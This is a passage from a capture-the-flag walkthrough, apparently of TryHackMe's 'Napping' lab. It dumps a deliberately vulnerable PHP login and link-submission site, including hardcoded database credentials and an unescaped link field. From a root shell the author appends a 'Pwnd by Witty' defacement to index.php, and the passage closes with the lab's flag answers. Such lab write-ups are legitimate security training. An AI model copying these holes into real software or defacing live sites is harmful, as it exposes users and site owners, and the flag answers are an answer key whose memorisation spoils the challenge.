server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'Stop@Napping3!');
define('DB_NAME', 'website');

/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($mysqli === false){
        die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>

daniel@napping:/var/www/html$ cat index.php 
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if(isset($_SESSION["loggedin"]) && $_SESSION["id"] === 0){
        header("location: welcome.php");
        exit;
}

// Include config file
require_once "config.php";

// Define variables and initialize with empty values
$username = $password = "";
$username_err = $password_err = $login_err = "";

// Processing form data when form is submitted
if($_SERVER["REQUEST_METHOD"] == "POST"){

        // Check if username is empty
        if(empty(trim($_POST["username"]))){
                $username_err = "Please enter username.";
        } else{
                $username = trim($_POST["username"]);
        }

        // Check if password is empty
        if(empty(trim($_POST["password"]))){
                $password_err = "Please enter your password.";
        } else{
                $password = trim($_POST["password"]);
        }

        // Validate credentials
        if(empty($username_err) && empty($password_err)){
                // Prepare a select statement
                $sql = "SELECT id, username, password FROM users WHERE username = ?";

                if($stmt = $mysqli->prepare($sql)){
                        // Bind variables to the prepared statement as parameters
                        $stmt->bind_param("s", $param_username);

                        // Set parameters
                        $param_username = $username;

                        // Attempt to execute the prepared statement
                        if($stmt->execute()){
                                // Store result
                                $stmt->store_result();

                                // Check if username exists, if yes then verify password
                                if($stmt->num_rows == 1){                    
                                        // Bind result variables
                                        $stmt->bind_result($id, $username, $hashed_password);
                                        if($stmt->fetch()){
                                                if(password_verify($password, $hashed_password)){
                                                        // Password is correct, so start a new session
                                                        session_start();

                                                        // Store data in session variables
                                                        $_SESSION["loggedin"] = true;
                                                        $_SESSION["id"] = 0;
                                                        $_SESSION["username"] = $username;                            

                                                        // Redirect user to welcome page
                                                        header("location: welcome.php");
                                                } else{
                                                        // Password is not valid, display a generic error message
                                                        $login_err = "Invalid username or password.";
                                                }
                                        }
                                } else{
                                        // Username doesn't exist, display a generic error message
                                        $login_err = "Invalid username or password.";
                                }
                        } else{
                                echo "Oops! Something went wrong. Please try again later.";
                        }

                        // Close statement
                        $stmt->close();
                }
        }

        // Close connection
        $mysqli->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Login</h2>
        <p>Please fill in your credentials to login.</p>

<?php 
if(!empty($login_err)){
        echo '<div class="alert alert-danger">' . $login_err . '</div>';
}        
?>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control <?php echo (!empty($username_err)) ? 'is-invalid' : ''; ?>" value="<?php echo $username; ?>">
                <span class="invalid-feedback"><?php echo $username_err; ?></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control <?php echo (!empty($password_err)) ? 'is-invalid' : ''; ?>">
                <span class="invalid-feedback"><?php echo $password_err; ?></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
daniel@napping:/var/www/html$ cat logout.php 
<?php
// Initialize the session
session_start();
 
// Unset all of the session variables
$_SESSION = array();
 
// Destroy the session.
session_destroy();
 
// Redirect to login page
header("location: index.php");
exit;
?>
daniel@napping:/var/www/html$ cat register.php 
<?php
// Include config file
require_once "config.php";
 
// Define variables and initialize with empty values
$username = $password = $confirm_password = "";
$username_err = $password_err = $confirm_password_err = "";
 
// Processing form data when form is submitted
if($_SERVER["REQUEST_METHOD"] == "POST"){
 
    // Validate username
    if(empty(trim($_POST["username"]))){
        $username_err = "Please enter a username.";
    } elseif(!preg_match('/^[a-zA-Z0-9_]+$/', trim($_POST["username"]))){
        $username_err = "Username can only contain letters, numbers, and underscores.";
    } else{
        // Prepare a select statement
        $sql = "SELECT id FROM users WHERE username = ?";
        
        if($stmt = $mysqli->prepare($sql)){
            // Bind variables to the prepared statement as parameters
            $stmt->bind_param("s", $param_username);
            
            // Set parameters
            $param_username = trim($_POST["username"]);
            
            // Attempt to execute the prepared statement
            if($stmt->execute()){
                // store result
                $stmt->store_result();
                
                if($stmt->num_rows == 1){
                    $username_err = "This username is already taken.";
                } else{
                    $username = trim($_POST["username"]);
                }
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }

            // Close statement
            $stmt->close();
        }
    }
    
    // Validate password
    if(empty(trim($_POST["password"]))){
        $password_err = "Please enter a password.";     
    } elseif(strlen(trim($_POST["password"])) < 6){
        $password_err = "Password must have atleast 6 characters.";
    } else{
        $password = trim($_POST["password"]);
    }
    
    // Validate confirm password
    if(empty(trim($_POST["confirm_password"]))){
        $confirm_password_err = "Please confirm password.";     
    } else{
        $confirm_password = trim($_POST["confirm_password"]);
        if(empty($password_err) && ($password != $confirm_password)){
            $confirm_password_err = "Password did not match.";
        }
    }
    
    // Check input errors before inserting in database
    if(empty($username_err) && empty($password_err) && empty($confirm_password_err)){
        
        // Prepare an insert statement
        $sql = "INSERT INTO users (username, password) VALUES (?, ?)";
         
        if($stmt = $mysqli->prepare($sql)){
            // Bind variables to the prepared statement as parameters
            $stmt->bind_param("ss", $param_username, $param_password);
            
            // Set parameters
            $param_username = $username;
            $param_password = password_hash($password, PASSWORD_DEFAULT); // Creates a password hash
            
            // Attempt to execute the prepared statement
            if($stmt->execute()){
                // Redirect to login page
                header("location: index.php");
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }

            // Close statement
            $stmt->close();
        }
    }
    
    // Close connection
    $mysqli->close();
}
?>
 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign Up</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Sign Up</h2>
        <p>Please fill this form to create an account.</p>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control <?php echo (!empty($username_err)) ? 'is-invalid' : ''; ?>" value="<?php echo $username; ?>">
                <span class="invalid-feedback"><?php echo $username_err; ?></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control <?php echo (!empty($password_err)) ? 'is-invalid' : ''; ?>" value="<?php echo $password; ?>">
                <span class="invalid-feedback"><?php echo $password_err; ?></span>
            </div>
            <div class="form-group">
                <label>Confirm Password</label>
                <input type="password" name="confirm_password" class="form-control <?php echo (!empty($confirm_password_err)) ? 'is-invalid' : ''; ?>" value="<?php echo $confirm_password; ?>">
                <span class="invalid-feedback"><?php echo $confirm_password_err; ?></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Submit">
                <input type="reset" class="btn btn-secondary ml-2" value="Reset">
            </div>
            <p>Already have an account? <a href="index.php">Login here</a>.</p>
        </form>
    </div>    
</body>
</html>
daniel@napping:/var/www/html$ cat reset-password.php 
<?php
// Initialize the session
session_start();

if(!isset($_SESSION["loggedin"]) || $_SESSION["id"] !== 0){
        header("location: index.php");
        exit;
}

// Include config file
require_once "config.php";

// Define variables and initialize with empty values
$new_password = $confirm_password = "";
$new_password_err = $confirm_password_err = "";

// Processing form data when form is submitted
if($_SERVER["REQUEST_METHOD"] == "POST"){

        // Validate new password
        if(empty(trim($_POST["new_password"]))){
                $new_password_err = "Please enter the new password.";     
        } elseif(strlen(trim($_POST["new_password"])) < 6){
                $new_password_err = "Password must have atleast 6 characters.";
        } else{
                $new_password = trim($_POST["new_password"]);
        }

        // Validate confirm password
        if(empty(trim($_POST["confirm_password"]))){
                $confirm_password_err = "Please confirm the password.";
        } else{
                $confirm_password = trim($_POST["confirm_password"]);
                if(empty($new_password_err) && ($new_password != $confirm_password)){
                        $confirm_password_err = "Password did not match.";
                }
        }

        // Check input errors before updating the database
        if(empty($new_password_err) && empty($confirm_password_err)){
                // Prepare an update statement
                $sql = "UPDATE users SET password = ? WHERE id = ?";

                if($stmt = $mysqli->prepare($sql)){
                        // Bind variables to the prepared statement as parameters
                        $stmt->bind_param("si", $param_password, $param_id);

                        // Set parameters
                        $param_password = password_hash($new_password, PASSWORD_DEFAULT);
                        $param_id = $_SESSION["id"];

                        // Attempt to execute the prepared statement
                        if($stmt->execute()){
                                // Password updated successfully. Destroy the session, and redirect to login page
                                session_destroy();
                                header("location: index.php");
                                exit();
                        } else{
                                echo "Oops! Something went wrong. Please try again later.";
                        }

                        // Close statement
                        $stmt->close();
                }
        }

        // Close connection
        $mysqli->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Reset Password</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Reset Password</h2>
        <p>Please fill out this form to reset your password.</p>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post"> 
            <div class="form-group">
                <label>New Password</label>
                <input type="password" name="new_password" class="form-control <?php echo (!empty($new_password_err)) ? 'is-invalid' : ''; ?>" value="<?php echo $new_password; ?>">
                <span class="invalid-feedback"><?php echo $new_password_err; ?></span>
            </div>
            <div class="form-group">
                <label>Confirm Password</label>
                <input type="password" name="confirm_password" class="form-control <?php echo (!empty($confirm_password_err)) ? 'is-invalid' : ''; ?>">
                <span class="invalid-feedback"><?php echo $confirm_password_err; ?></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Submit">
                <a class="btn btn-link ml-2" href="welcome.php">Cancel</a>
            </div>
        </form>
    </div>    
</body>
</html>

daniel@napping:/var/www/html$ cat welcome.php 
<?php                                                                                                                                                                                                                                        
// Initialize the session                                                                                                                                                                                                                    
session_start();                                                                                                                                                                                                                             

// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["id"] !== 0){
        header("location: index.php");
        exit;
}

$mysqli = new mysqli("localhost", "adrian", "Stop@Napping3!", "website");

// Check connection
if($mysqli === false){
        die("ERROR: Could not connect. " . $mysqli->connect_error);
}

$message = "";                                                                                                                                                                                                                               
if(isset($_POST['submit'])){ //check if form was submitted
        $input = $mysqli->real_escape_string($_POST['url']);                                                                                                                                                                                 
        $sql = "INSERT INTO links (link) VALUES ('$input')";                                                                                                                                                                                 
        if($mysqli->query($sql) === true){                                                                                                                                                                                                   
                $message = "Thank you for your submission, you have entered: <a href='$input' target='_blank' >Here</a>";                                                                                                                    
        } else{                                                                                                                                                                                                                              
                $message = "It is totally free!";                                                                                                                                                                                            
        }                                                                                                                                                                                                                                    
}else{                                                                                                                                                                                                                                       
        $message = "It is totally free!";                                                                                                                                                                                                                                                                                                                                                                                                                                                 
}                                                                                                                                                                                                                                            
?>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                             
<!DOCTYPE html>                                                                                                                                                                                                                              
<html lang="en">                                                                                                                                                                                                                             
<head>                                                                                                                                                                                                                                       
    <meta charset="UTF-8">                                                                                                                                                                                                                   
    <title>Welcome</title>                                                                                                                                                                                                                   
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">                                                                                                                                  
    <style>                                                                                                                                                                                                                                  
        body{ font: 14px sans-serif; text-align: center; }                                                                                                                                                                                   
    </style>                                                                                                                                                                                                                                 
</head>                                                                                                                                                                                                                                      
<body>                                                                                                                                                                                                                                       
    <h1 class="my-5">Hello, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>! Welcome to our free blog promotions site.</h1>                                                                                                    
    <h1 class="my-5">Please submit your link so that we can get started.<br> All links will be reviewed by our admin who also built this site!</h1>                                                                                          
    <form action="" method="post">                                                                                                                                                                                                           
                <label for="link">Blog Link:</label>
                <input type="text" placeholder='http://visitme.com/' id="link" name="url"><br><br>
                <input type="submit" name="submit" value="Submit">
                <br>
                <br>
                <?php echo "<p>{$message}</p>"; ?>
    </form> 
    <br>
    <p>
        <a href="reset-password.php" class="btn btn-warning">Reset Your Password</a>
        <a href="logout.php" class="btn btn-danger ml-3">Sign Out of Your Account</a>
    </p>

</body>
</html>

cd admin
# ls
ls
config.php  login.php  logout.php  welcome.php
# cat config.php
cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'Stop@Napping3!');
define('DB_NAME', 'website');
 
/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($mysqli === false){
    die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>
# cat login.php
cat login.php
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if($_SESSION["id"] === 1){
        header("location: welcome.php");
        exit;
}

// Include config file
require_once "config.php";

// Define variables and initialize with empty values
$username = $password = "";
$username_err = $password_err = $login_err = "";

// Processing form data when form is submitted
if($_SERVER["REQUEST_METHOD"] == "POST"){

        // Check if username is empty
        if(empty(trim($_POST["username"]))){
                $username_err = "Please enter username.";
        } else{
                $username = trim($_POST["username"]);
        }

        // Check if password is empty
        if(empty(trim($_POST["password"]))){
                $password_err = "Please enter your password.";
        } else{
                $password = trim($_POST["password"]);
        }

        // Validate credentials
        if(empty($username_err) && empty($password_err)){
                // Prepare a select statement
                $sql = "SELECT id, username, password FROM admin WHERE username = ?";

                if($stmt = $mysqli->prepare($sql)){
                        // Bind variables to the prepared statement as parameters
                        $stmt->bind_param("s", $param_username);

                        // Set parameters
                        $param_username = $username;

                        // Attempt to execute the prepared statement
                        if($stmt->execute()){
                                // Store result
                                $stmt->store_result();

                                // Check if username exists, if yes then verify password
                                if($stmt->num_rows == 1){                    
                                        // Bind result variables
                                        $stmt->bind_result($id, $username, $hashed_password);
                                        if($stmt->fetch()){
                                                if(password_verify($password, $hashed_password)){
                                                        // Password is correct, so start a new session
                                                        session_start();

                                                        // Store data in session variables
                                                        $_SESSION["loggedin"] = true;
                                                        $_SESSION["id"] = 1;
                                                        $_SESSION["username"] = $username;                            

                                                        // Redirect user to welcome page
                                                        header("location: welcome.php");
                                                } else{
                                                        // Password is not valid, display a generic error message
                                                        $login_err = "Invalid username or password.";
                                                }
                                        }
                                } else{
                                        // Username doesn't exist, display a generic error message
                                        $login_err = "Invalid username or password.";
                                }
                        } else{
                                echo "Oops! Something went wrong. Please try again later.";
                        }

                        // Close statement
                        $stmt->close();
                }
        }

        // Close connection
        $mysqli->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Admin Login</h2>
        <p>Please fill in your credentials to login.</p>

<?php 
if(!empty($login_err)){
        echo '<div class="alert alert-danger">' . $login_err . '</div>';
}        
?>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control <?php echo (!empty($username_err)) ? 'is-invalid' : ''; ?>" value="<?php echo $username; ?>">
                <span class="invalid-feedback"><?php echo $username_err; ?></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control <?php echo (!empty($password_err)) ? 'is-invalid' : ''; ?>">
                <span class="invalid-feedback"><?php echo $password_err; ?></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>
</html>

# cat logout.php
cat logout.php
<?php
// Initialize the session
session_start();
 
// Unset all of the session variables
$_SESSION = array();
 
// Destroy the session.
session_destroy();
 
// Redirect to login page
header("location: login.php");
exit;
?>
# cat welcome.php
cat welcome.php
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if($_SESSION["id"] !== 1 ){
        header("location: login.php");
        exit;
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <h1 class="my-5">Welcome back <?php echo htmlspecialchars($_SESSION["username"]); ?></h1>
    <p>Submitted Links:</p>
<center>
<?php
$host    = "localhost";
$user    = "adrian";
$pass    = "Stop@Napping3!";
$db_name = "website";

//create connection
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
$connection = mysqli_connect($host, $user, $pass, $db_name);

//get results from database
$result = mysqli_query($connection, "SELECT * FROM links");
$all_property = array();  //declare an array for saving property

//showing property
echo '<table class="data-table">
        <tr class="data-heading">';  //initialize table tag
while ($property = mysqli_fetch_field($result)) {
        $all_property[] = $property->name;  //save those to array
}
echo '</tr>'; //end tr tag

//showing all data
while ($row = mysqli_fetch_array($result)) {
        echo "<tr>";
        foreach ($all_property as $item) {
                echo "<td><a href=" . $row[$item] . " target='_blank' >" . $row[$item] ."</a></td>"; //get items using property value
        }
        echo '</tr>';
}
echo "</table>";
?>
</center>

        <br>
        <p>
        <a href="logout.php" class="btn btn-danger ml-3">Sign Out of Your Account</a>
        </p> 

        </body>
        </html>
# echo "<h1>Pwnd by Witty</h1>" >> index.php



```

![[Pasted image 20230110120333.png]]

![[Pasted image 20230110135338.png]]


![[Pasted image 20230110135315.png]]

![[Pasted image 20230110151727.png]]


What is the user flag?  

*THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}*

What is the root flag?

	*THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}*


[[Kubernetes for Everyone]]